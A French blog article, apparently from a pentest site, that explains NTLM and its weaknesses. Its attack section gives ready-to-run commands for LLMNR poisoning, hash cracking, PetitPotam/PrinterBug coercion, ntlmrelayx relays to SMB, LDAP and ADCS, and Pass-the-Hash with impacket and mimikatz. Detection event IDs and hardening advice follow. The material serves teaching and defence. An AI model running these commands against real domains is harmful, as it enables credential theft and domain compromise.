> **TL;DR** — NTLM est un protocole challenge/réponse qui **ne lie jamais l'authentification au service cible**. C'est cette seule faiblesse de conception qui rend le **relais** possible : on redirige un échange NTLM capturé vers un autre service, sans jamais casser le mot de passe. On déroule la capture NTLMv2 (empoisonnement LLMNR/NBT-NS/mDNS), la coercition (PetitPotam, PrinterBug, DFSCoerce), le relais (SMB, LDAP→RBCD, HTTP→ADCS ESC8) et le Pass-the-Hash, puis la détection (Event 4776, 4624 type 3, audit NTLM 8004/8003) et le durcissement : **SMB signing**, **LDAP channel binding**, **EPA**.
{: .prompt-info }

|---|---|

| **Transport** | Encapsulé dans SMB, HTTP, LDAP, MSSQL, RPC… via SPNEGO/Negotiate |
| **Secret** | Hash NT = `MD4(mot de passe UTF-16LE)`, sans sel |
| **Faiblesse de fond** | Pas de liaison au canal/service → relais possible |

Cet article est le pendant NTLM de celui consacré à [Kerberos](/posts/kerberos/). Beaucoup de chaînes basculent de l'un à l'autre : un relais NTLM vers LDAP écrit une délégation **RBCD**, puis on repasse côté Kerberos pour usurper un admin.

## 1. Fonctionnement

### 1.1 Nature du protocole

NTLM est le protocole d'authentification **challenge/réponse** historique de Microsoft, spécifié par **MS-NLMP**. Il est encapsulé dans d'autres protocoles (SMB, HTTP via `WWW-Authenticate`, LDAP, MSSQL, RPC…), le plus souvent à travers **SPNEGO/Negotiate**. Contrairement à Kerberos, il n'y a **pas de tiers de confiance en ligne** : le serveur valide les credentials via le DC (canal Netlogon) pour un compte de domaine, ou localement (base SAM) pour un compte local.

### 1.2 Les trois messages

```text
Client                                   Serveur
  │                                         │
  │── NEGOTIATE (Type 1 : flags) ──────────▶│
  │◀─ CHALLENGE (Type 2 : nonce 8 octets) ──│
  │── AUTHENTICATE (Type 3 : réponse) ─────▶│
  │                                         │
  │                                         │── validation DC (Netlogon) ─▶ [DC: 4776]
```

1. **NEGOTIATE (Type 1)** : le client annonce ses capacités et ses flags.
2. **CHALLENGE (Type 2)** : le serveur renvoie un **challenge de 8 octets** (un nonce), ses flags et le `TargetInfo`.
3. **AUTHENTICATE (Type 3)** : le client renvoie une **réponse** calculée à partir du challenge et de sa clé (dérivée du hash NT), avec domaine/utilisateur/workstation.

### 1.3 Hash NT et canal Netlogon

Le **hash NT** est `MD4(mot de passe en UTF-16LE)`, **sans sel, sans itération**. C'est le secret réutilisable (base du Pass-the-Hash), et au passage la clé RC4 côté Kerberos (voir l'article [Kerberos](/posts/kerberos/)). Sur un AD moderne, LM est désactivé par défaut.

Pour un compte de **domaine**, le serveur transmet le challenge et la réponse au DC via le canal sécurisé **Netlogon (MS-NRPC)** ; le DC valide et répond, ce qui génère l'**Event 4776** côté DC. C'est précisément ce canal qui a été frappé par **ZeroLogon (CVE-2020-1472)** : un chiffrement AES-CFB8 mal initialisé permettait de réinitialiser le mot de passe du compte machine du DC (corrigé en 2020, enforcement 2021).

### 1.4 NTLMv1 vs NTLMv2

- **NTLMv1** : réponse = `DES(hash NT, challenge serveur)`. Faible, réductible à du DES, crackable quasi systématiquement (via crack.sh). Aucun challenge client. À proscrire : si NTLMv1 est accepté, on force un downgrade et on casse le hash NT.
- **NTLMv2** : réponse = **HMAC-MD5** incluant le challenge serveur **+ un challenge client + un timestamp + le TargetInfo**. Non rejouable tel quel, mais le NTLMv2 capturé reste **crackable hors-ligne** (le mot de passe) et surtout **relayable**. Pour relayer, on ne « casse » jamais le hash : on relaie l'échange tel quel.

### 1.5 Le point clé pour l'offensive

NTLM **ne lie pas l'authentification au service cible** : il n'y a ni canal signé, ni SPN vérifié comme en Kerberos. Un échange prouve « ce client connaît le secret », pas « ce client veut parler à *ce* serveur ». C'est exactement ce qui rend le **relais** possible. Toutes les protections de la §4 (signing, channel binding, EPA) ne font qu'une chose : **re-lier l'échange au canal** pour fermer cette porte.

## 2. Attaques

> **Autorisation** — Empoisonner la résolution de noms, coercer une machine ou relayer une authentification se pratique uniquement sur un **périmètre explicitement autorisé** (mandat de pentest ou lab). Ces techniques détournent du trafic d'authentification réel : hors cadre, c'est illégal. Les commandes sont commentées pour la compréhension du mécanisme.
{: .prompt-warning }

```text
Position réseau interne
   │  LLMNR/NBT-NS/mDNS poisoning (Responder)
   ▼
Capture NTLMv2                 ─── ou ───   Coercition (PetitPotam/PrinterBug)
   │  crack hors-ligne (mode 5600)                   │ force un compte machine
   ▼                                                 ▼
Mot de passe                              NTLM Relay (ntlmrelayx / certipy)
                                             ├─ → SMB  : exécution / dump SAM
                                             ├─ → LDAP : RBCD → voir Kerberos
                                             └─ → HTTP : ADCS ESC8 → cert → TGT
```

### 2.1 Empoisonnement LLMNR / NBT-NS / mDNS + capture NTLMv2

**Principe.** Quand la résolution DNS échoue, Windows interroge en broadcast/multicast via **LLMNR (UDP 5355)**, **NBT-NS (UDP 137)** et **mDNS (UDP 5353)**. Ces protocoles n'authentifient pas les réponses : l'attaquant répond « c'est moi », la victime s'authentifie vers lui en NTLM, et on capture l'échange **NTLMv2**.

**Exploitation.**

```bash
# Responder empoisonne LLMNR/NBT-NS/mDNS et capture les échanges
sudo responder -I eth0 -wv
# → [SMB] NTLMv2-SSP Hash : user::DOMAIN:<challenge>:<réponse>...
```

```bash
# Crack hors-ligne
hashcat -m 5600 ntlmv2.hash /usr/share/wordlists/rockyou.txt   # NetNTLMv2
hashcat -m 5500 ntlmv1.hash /usr/share/wordlists/rockyou.txt   # NetNTLMv1 (si downgrade)
```

Si NTLMv1 est accepté, on force le downgrade (Responder avec challenge fixe `1122334455667788`) pour casser via crack.sh. Côté Windows, l'équivalent de Responder est **Inveigh**.

**Résultat / impact.** Un ou plusieurs NTLMv2 capturés passivement ; ceux dont le mot de passe est faible tombent hors-ligne. Chaque capture d'un même compte diffère (challenge aléatoire), mais le mot de passe sous-jacent est identique.

### 2.2 Coercition d'authentification

**Principe.** Plutôt que d'attendre qu'une victime se trompe de nom, on **force** une machine à s'authentifier en NTLM vers nous, pour capturer ou relayer. On vise souvent un **DC** ou un serveur, dont le compte machine est privilégié. On abuse pour cela d'API RPC qui déclenchent une connexion sortante.

**Exploitation.**

```bash
# PetitPotam (MS-EFSR, CVE-2021-36942) — contre un DC non patché, sans authentification
python3 PetitPotam.py <attacker_ip> <dc_ip>

# PrinterBug (MS-RPRN) — requiert le service Spooler actif + un compte quelconque
python3 printerbug.py 'corp.local/user:pass'@<target> <attacker_ip>

# Coercer agrège les vecteurs : MS-EFSR, MS-RPRN, MS-DFSNM (DFSCoerce), MS-FSRVP...
coercer coerce -u user -p pass -t <target> -l <attacker_ip>
```

NetExec intègre également `--coerce-plus` pour balayer ces vecteurs.

**Résultat / impact.** Une authentification NTLM d'un compte privilégié (typiquement `DC01$`) dirigée vers l'attaquant, prête à être relayée. C'est le déclencheur de la plupart des chaînes de relais contre un DC.

### 2.3 NTLM Relay

**Principe.** On relaie l'échange NTLM capturé ou coercé vers **un autre service** qui l'accepte, exactement ce que permet la faiblesse de la §1.5. On obtient une session **au nom de la victime** sans jamais casser son hash. Le relais n'est viable que si la cible **ne lie pas l'échange au canal** :

| Cible | Condition nécessaire |
|---|---|
| **SMB** | SMB signing **non requis** côté cible |
| **LDAP / LDAPS** | LDAP signing et channel binding (EPA) **non appliqués** |
| Cross-protocole | **MIC removal** (CVE-2019-1040/1166/1019) sur cibles non patchées |

**Exploitation — relais vers SMB.**

```bash
# Exécution / dump SAM & LSA si l'utilisateur relayé est admin local sur la cible
impacket-ntlmrelayx -t smb://CIBLE -smb2support
```

**Exploitation — relais vers LDAP → RBCD.**

```bash
# On relaie un compte machine vers LDAP pour écrire msDS-AllowedToActOnBehalfOf...
impacket-ntlmrelayx -t ldap://DC --delegate-access --no-dump
# → délégation RBCD posée → on bascule côté Kerberos (getST -impersonate Administrator)
```

Cette branche se termine côté Kerberos : voir la section RBCD de l'article [Kerberos](/posts/kerberos/).

**Exploitation — relais vers HTTP → ADCS (ESC8).**

```bash
# L'endpoint Web Enrollment accepte NTLM sans signing : on obtient un certificat machine
impacket-ntlmrelayx -t http://CA/certsrv/certfnsh.asp -smb2support --adcs --template Machine

# Certipy fait relais + récupération du cert en un seul outil
certipy relay -target http://CA -template Machine
# → certificat → PKINIT → TGT du compte machine → usurpation
```

Pour générer la liste des cibles SMB sans signing, et coupler à un spoof IPv6 :

```bash
nxc smb 10.10.10.0/24 --gen-relay-list targets.txt   # cibles relayables
# mitm6 (spoof DHCPv6/DNS IPv6) couplé à ntlmrelayx -6 pour capter les requêtes
```

**Résultat / impact.** Selon la cible : exécution de code et dump de secrets (SMB), délégation RBCD menant à l'usurpation d'un admin (LDAP), ou certificat machine converti en TGT via PKINIT (HTTP/ADCS ESC8). Le relais est la raison pour laquelle NTLM reste si dangereux en 2026.

### 2.4 Pass-the-Hash

**Principe.** La réponse NTLM ne dépend que du **hash NT**, jamais du mot de passe en clair. Avec le hash, on s'authentifie donc directement, sans jamais connaître ni cracker le mot de passe.

**Exploitation.**

```bash
# Impacket : le hash NT remplace le mot de passe
impacket-psexec corp.local/user@target -hashes :31d6cfe0d16ae931b73c59d7e0c089c0
impacket-secretsdump corp.local/user@target -hashes :<NT>

# NetExec et evil-winrm
nxc smb <target> -u user -H <NT>
evil-winrm -i <target> -u user -H <NT>
```

```powershell
mimikatz # sekurlsa::pth /user:user /ntlm:<NT> /domain:corp.local
```

**Résultat / impact.** Mouvement latéral à partir d'un hash (dump SAM/LSASS, DCSync, NTDS.dit). Si le même hash d'admin local est partagé sur le parc (pas de LAPS), un seul dump ouvre tout le réseau. Côté Kerberos, l'équivalent est l'**Overpass-the-Hash** (hash → TGT).

## 3. Détection

| Signal | Event ID / Journal | Ce qu'on surveille |
|---|---|---|
| Validation NTLM par le DC | **4776** (DC) | **Événement central NTLM** ; volume/sources anormales = PtH, spraying, relais |
| Logon réseau à distance | **4624** type 3 | *Authentication Package = NTLM* → relais / PtH distant |
| Échec de logon | **4625** | Spraying NTLM |
| Accès partage SMB | **5145** | Accès post-relais (detailed file share, objet par objet) |
| NTLM audité côté serveur/DC | **8004** (`Microsoft-Windows-NTLM/Operational`) | Identifie client + serveur + compte NTLM, base de l'inventaire avant durcissement |
| NTLM sortant côté serveur membre | **8003** | Trafic NTLM vers serveurs distants |
| NTLM sortant côté client | **8001 / 8002** | Trafic NTLM sortant audité |

Le journal `Microsoft-Windows-NTLM/Operational` (activé par la stratégie *Restrict NTLM: Audit*) est la pièce maîtresse : les événements **8004/8003** permettent de **cartographier précisément** qui parle NTLM à qui, avant toute décision de blocage. Signaux complémentaires à chasser : du **NTLMv1 encore observé** (downgrade), des authentifications NTLM de **comptes machine vers des hôtes inattendus** (coercition/relais), et des **pics LLMNR/NBT-NS**.

## 4. Recommandations

| Priorité | Mesure | Bloque / atténue |
|---|---|---|
| <span class="sev sev-critical">Critique</span> | **SMB signing requis** (GPO *Digitally sign communications (always)*) | Relais SMB |
| <span class="sev sev-critical">Critique</span> | **LDAP signing + channel binding (EPA)** sur les DC (*Require signing* + *channel binding = Always*) | Relais vers LDAP (RBCD / DCSync) |
| <span class="sev sev-critical">Critique</span> | **EPA + HTTPS** sur l'endpoint Web Enrollment ADCS (ou désactiver l'enrôlement web) | Relais HTTP → ADCS (ESC8) |
| <span class="sev sev-high">Haute</span> | **Désactiver LLMNR, NBT-NS, mDNS** (GPO *Turn off multicast name resolution*, désactiver NetBIOS over TCP/IP) | Empoisonnement / capture NTLMv2 |
| <span class="sev sev-high">Haute</span> | **Correctifs coercition** : PetitPotam (CVE-2021-36942), désactiver le Spooler sur DC/serveurs sensibles, patches MIC removal (CVE-2019-1040) | Coercition, relais cross-protocole |
| <span class="sev sev-high">Haute</span> | **Protected Users** pour les comptes sensibles (NTLM interdit) | Toute authentification NTLM du membre |
| <span class="sev sev-medium">Moyenne</span> | **Restrict NTLM** (après audit via 8001-8004) : *Audit all* puis *Deny all* progressif | NTLM entrant/sortant superflu |
| <span class="sev sev-medium">Moyenne</span> | **Désactiver NTLMv1** (*LAN Manager authentication level = Send NTLMv2 only, refuse LM & NTLM*) | Downgrade NTLMv1 / crack du hash NT |
| <span class="sev sev-medium">Moyenne</span> | **Réduire `MachineAccountQuota` à 0** | RBCD via relais LDAP |
| <span class="sev sev-low">Basse</span> | **LAPS / Windows LAPS** | Pass-the-Hash latéral (hash local unique) |

### Bonnes pratiques

- [ ] **SMB signing requis** partout (serveurs *et* clients), NAS tiers compatibles vérifiés.
- [ ] **LDAP signing + channel binding** appliqués sur tous les DC.
- [ ] **ADCS** : Web Enrollment en HTTPS + EPA, ou enrôlement web désactivé.
- [ ] **LLMNR / NBT-NS / mDNS désactivés** par GPO.
- [ ] **NTLMv1 interdit** ; audit NTLM (8001-8004) activé et exploité.
- [ ] Correctifs **coercition** (PetitPotam, MIC removal) et **ZeroLogon** appliqués ; Spooler désactivé hors serveurs d'impression.
- [ ] Comptes sensibles dans **Protected Users** ; `MachineAccountQuota = 0`.
- [ ] Trajectoire **Restrict NTLM** engagée (audit → deny progressif).

## 5. Actualité (2024-2026)

- **Dépréciation officielle de NTLM (juin 2024).** Microsoft inscrit NTLM (v1 et v2) parmi les fonctionnalités **dépréciées** de Windows et recommande de remplacer les appels NTLM par **Negotiate** (Kerberos d'abord, fallback NTLM). NTLM continue de fonctionner sous Windows 11 24H2 et Server 2025.
- **« Disabling NTLM by default » (janv. 2026).** Microsoft a détaillé une feuille de route **par phases** pour désactiver NTLM **par défaut** (audit renforcé sous 24H2 / Server 2025 d'abord), en précisant que « désactiver par défaut » ne signifie pas retirer complètement NTLM.
- **SMB signing requis par défaut.** Depuis **Windows 11 24H2** (éditions Pro/Enterprise/Education : signing **entrant ET sortant** requis ; Home non requis) et **Windows Server 2025** (**sortant** requis). Cela casse par défaut le relais SMB et oblige à corriger les NAS tiers non compatibles.
- **IAKerb & LocalKDC (previews 2026).** Deux extensions Kerberos annoncées par Microsoft (preview canal Insider Canary, juin 2026) pour réduire le fallback NTLM : Kerberos sans DC joignable (IAKerb) et KDC local pour les **comptes locaux en Kerberos/AES** (LocalKDC). Détails côté [Kerberos](/posts/kerberos/).
- **CVE-2025-33073 (correctif 10 juin 2025).** Contournement des mitigations de **NTLM reflection** dans le client SMB → **RCE SYSTEM** sur toute machine **sans SMB signing** ; la recherche (Synacktiv / RedTeam Pentesting) montre que la faille touche **aussi Kerberos**. Ajoutée au catalogue **CISA KEV** (oct. 2025). Mitigation : **SMB signing**. À rapprocher de la CVE-2025-58726 (reflection Kerberos) côté [Kerberos](/posts/kerberos/).
- **ESC8 / PetitPotam.** Microsoft a durci côté ADCS (EPA recommandé/par défaut sur Web Enrollment), mais ESC8 reste exploitable sur toute CA web **sans HTTPS + EPA**.
